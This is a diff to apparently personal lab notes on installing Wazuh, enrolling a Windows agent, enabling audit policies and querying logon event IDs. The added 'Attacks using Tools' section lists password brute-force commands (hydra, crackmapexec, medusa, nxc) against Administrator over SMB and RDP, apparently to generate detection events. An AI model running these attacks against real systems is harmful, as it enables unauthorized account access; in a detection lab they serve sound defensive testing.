@@ -1,4 +1,5 @@
 # Wazuh Setup
+----------------
 
 ## Install Wazuh Ubuntu Server
 
@@ -17,6 +18,7 @@ sudo systemctl enable wazuh-dashboard
 sudo systemctl status wazuh-manager
 
 # CONNECT WINDOWS TO WAZUH
+---------------------------
 On Windows 11 & Server
 Install Agent
 Download:
@@ -28,6 +30,7 @@ sudo /var/ossec/bin/manage_agents
 
 
 # Enable logging
+-----------------
 auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
 
 Enable other useful security logs
@@ -39,14 +42,22 @@ auditpol /set /category:"Policy Change" /success:enable /failure:enable
 Restart-Service WazuhSvc
 
 # Register agent
+----------------
 agent-auth.exe -m <WAZUH_SERVER_IP>
 
 # Start agent
+-------------
 net start WazuhSvc
 
-# Hydra attack
-hydra -l Administrator -P passwords.txt rdp://<WINDOWS_IP> -t 1 -W 3
+# Attacks using Tools
+--------------------
+hydra -I -l Administrator -P /usr/share/wordlists/rockyou.txt smb://<Windows_ip>
+hydra -I -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<Windows_ip>
+crackmapexec smb 192.168.0.165 -u Administrator -p /usr/share/wordlists/rockyou.txt
+medusa -h 192.168.0.165 -u Administrator -P passwords.txt -M rdp
+$ nxc smb 192.168.0.165 -u Administrator -P /usr/share/wordlists/rockyou.txt --igonre-pw-decoding
 
 # Wazuh queries
+----------------
 win.system.eventID:4625
 win.system.eventID:4624
